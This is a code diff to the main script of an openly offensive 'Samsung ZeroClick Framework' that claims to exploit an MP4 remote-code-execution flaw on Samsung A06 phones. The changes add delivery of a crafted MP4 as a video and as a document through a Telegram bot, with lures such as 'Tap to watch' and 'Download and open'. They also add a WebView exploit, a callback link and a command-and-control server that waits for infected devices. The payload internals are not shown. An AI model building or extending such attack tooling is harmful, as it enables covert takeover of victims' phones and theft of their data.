@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# main.py — Samsung ZeroClick Framework
+# main.py — Samsung ZeroClick Framework (Both Methods)
 
 import os
 import sys
@@ -23,9 +23,10 @@ BANNER = """
 ║        ██ ██   ██ ██  ██  ██ ██   ██ ██    ██ ██  ██ ██  ║
 ║   ███████ ██   ██ ██      ██ ██   ██  ██████  ██   ████  ║
 ║                                                           ║
-║   Samsung ZeroClick Framework v1.0                       ║
+║   Samsung ZeroClick Framework v2.0                       ║
 ║   Target: Samsung A06 — Android 16                       ║
 ║   CVE-2026-0006 — MP4 Zero-Click RCE                    ║
+║   Methods: Video (primary) → Document (fallback)         ║
 ║   Made in Ethiopia 🇪🇹                                   ║
 ╚═══════════════════════════════════════════════════════════╝
 """
@@ -51,13 +52,13 @@ class SamsungZeroClick:
         print(f"[+] Callback URL: {self.callback_url}")
         print(f"[+] Telegram Bot: {self.bot_token[:10]}...")
         
-        # Start C2 in background
+        # Start C2
         print("[+] Starting C2 server...")
         c2_thread = threading.Thread(target=self.c2_server.run, daemon=True)
         c2_thread.start()
         time.sleep(1)
         
-        # Generate both exploits
+        # Generate exploits
         print("\n[+] Generating exploits...")
         mp4_data = self.mp4_exploit.generate()
         webview_data = self.webview_exploit.generate()
@@ -71,16 +72,36 @@ class SamsungZeroClick:
             "📦 Sending payloads..."
         )
         
-        # Deliver MP4 (primary) and HTML (fallback)
-        print("\n[+] Delivering MP4 exploit (Samsung APV)...")
-        mp4_success = self.delivery.deliver_samsung(mp4_data)
+        # ============ METHOD 1: VIDEO (PRIMARY) ============
+        print("\n[+] METHOD 1: Sending as video...")
+        video_success = self.delivery.send_video(
+            "payloads/exploit_samsung.mp4",
+            "🔥 Samsung A06 — Tap to watch"
+        )
         
-        print("[+] Delivering WebView fallback...")
+        # ============ METHOD 2: DOCUMENT (FALLBACK) ============
+        print("\n[+] METHOD 2: Sending as document...")
+        doc_success = self.delivery.send_document(
+            "payloads/exploit_samsung.mp4",
+            "🔥 Samsung A06 — Download and open"
+        )
+        
+        # ============ SEND WEBVIEW EXPLOIT ============
+        print("\n[+] Sending WebView exploit...")
         webview_success = self.delivery.deliver_webview(webview_data)
         
-        print("\n[+] ✅ EXPLOITS DELIVERED!")
-        print(f"    🎯 MP4: {'✅ Sent' if mp4_success else '❌ Failed'}")
+        # ============ SEND DIRECT LINK (OPTIONAL) ============
+        print("\n[+] Sending direct link...")
+        link_success = self.delivery.deliver_link(self.callback_url)
+        
+        # ============ SUMMARY ============
+        print("\n" + "=" * 50)
+        print("[+] ✅ EXPLOITS DELIVERED!")
+        print(f"    🎯 Video: {'✅ Sent' if video_success else '❌ Failed'}")
+        print(f"    🎯 Document: {'✅ Sent' if doc_success else '❌ Failed'}")
         print(f"    🎯 WebView: {'✅ Sent' if webview_success else '❌ Failed'}")
+        print(f"    🎯 Link: {'✅ Sent' if link_success else '❌ Failed'}")
+        print("=" * 50)
         print(f"\n[+] Monitor C2: {RAILWAY_PUBLIC_URL}/")
         print("[+] Waiting for callbacks...\n")
         
